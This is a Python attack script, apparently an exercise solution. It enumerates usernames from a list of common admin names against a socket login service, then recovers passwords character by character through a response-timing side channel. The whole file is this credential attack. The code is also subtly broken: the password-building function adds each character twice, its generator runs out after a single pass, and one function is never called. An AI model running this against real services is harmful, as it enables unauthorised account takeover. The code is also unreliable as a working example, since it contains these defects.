import socket
import sys
import itertools
import json
import string
import datetime

logins_list = [
	"admin", "Admin", "admin1", "admin2", "admin3",
	"user1", "user2", "root", "default", "new_user",
	"some_user", "new_admin", "administrator",
	"Administrator", "superuser", "super", "su", "alex",
	"suser", "rootuser", "adminadmin", "useruser",
	"superadmin", "username", "username1"
]
args = sys.argv
host = args[1]  # "localhost"
port = int(args[2])  # 9090


def password_generator(i):
	alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	for password in itertools.product(alphabet, repeat=i):
		yield "".join(password)


def try_logins(logins, client_socket):
	for login in logins:
		login = login.strip()
		message = json.dumps({"login": login, "password": " "})
		client_socket.send(message.encode())
		response = json.loads(client_socket.recv(1024))
		if response["result"] == "Wrong password!":
			return login.strip()


def next_symbol():
	yield from itertools.cycle(string.digits + string.ascii_letters)


def try_passwords(login, client_socket):
	password = ""
	symbols = password_generator(1)

	for symbol in symbols:
		password = password + symbol
		message = json.dumps({"login": login, "password": password +symbol})
		client_socket.send(message.encode())
		start = datetime.datetime.now()
		response = json.loads(client_socket.recv(1024))
		difference = datetime.datetime.now() - start
		if difference.total_seconds() > 0.1 or response["result"] == "Connection success!":
			password += symbol
			break
		'''if response["result"] == "Connection success!":
			print(json.dumps({"login": login, "password": password}))'''
		print(message)

def run(logins, client_socket):
	global valid_login, response, message
	for login in logins:
		login = login.strip()
		message = json.dumps({"login": login, "password": " "})
		client_socket.send(message.encode())
		response = json.loads(client_socket.recv(1024))
		if response["result"] == "Wrong password!":
			valid_login = login.strip()

	valid_password = ""
	symbols = password_generator(1)
	while response["result"] != "Connection success!":
		for symbol in symbols:
			#password = password + symbol
			message = json.dumps({"login": valid_login, "password": valid_password + symbol})
			client_socket.send(message.encode())
			start = datetime.datetime.now()
			response = json.loads(client_socket.recv(1024))
			difference = datetime.datetime.now() - start
			if difference.total_seconds() > 0.1 or response["result"] == "Connection success!":
				valid_password += symbol
				break
		print(message)


def hack():
	with socket.socket() as client_socket:
		address = (host, port)
		client_socket.connect(address)
		login = try_logins(logins_list, client_socket)
		try_passwords(login, client_socket)


hack()
